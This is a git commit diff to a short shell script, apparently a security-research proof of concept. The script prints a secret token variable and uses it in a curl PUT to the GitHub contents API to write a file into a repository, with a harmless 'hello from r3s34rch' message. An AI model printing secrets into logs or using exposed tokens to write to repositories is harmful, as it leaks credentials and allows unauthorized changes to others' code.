a0034a4183b86c3499f2136491da3ce1cd6d315e
Victim User <46316318+r3s34rch@users.noreply.github.com>
2023-12-15 14:51:11 +0100

    Update bash.sh

--- bash.sh
+++ bash.sh
@@ -9,12 +9,20 @@ echo "-----------------------------------------------------------------"
 echo "${TOKEN_VAL}"
 echo "-----------------------------------------------------------------"
 
-curl \
-    -X PUT \
-    -H "Accept: application/vnd.github.v3+json" \
-    -H "Authorization: Token $TOKEN_VAL" \
-    "https://api.github.com/repos/${REPO}/contents/README1.md" \
-    -d '{"message":"hello from r3s34rch","content":"'$(echo 'content'|base64)'", "sha":"SHA_FROM_ABOVE"}'
+curl -L \
+  -X PUT \
+  -H "Accept: application/vnd.github+json" \
+  -H "Authorization: Bearer $TOKEN_VAL" \
+  -H "X-GitHub-Api-Version: 2022-11-28" \
+  "https://api.github.com/repos/${REPO}/contents/README1.md" \
+  -d '{"message":"hello from r3s34rch","content":"bXkgbmV3IGZpbGUgY29udGVudHM="}'
+  
+#curl \
+#    -X PUT \
+#    -H "Accept: application/vnd.github.v3+json" \
+#    -H "Authorization: Token $TOKEN_VAL" \
+#    "https://api.github.com/repos/${REPO}/contents/README1.md" \
+#    -d '{"message":"hello from r3s34rch","content":"'$(echo 'content'|base64)'", "sha":"SHA_FROM_ABOVE"}'
 
 #curl "https://api.github.com/repos/${REPO}/contents/README.md"      
 
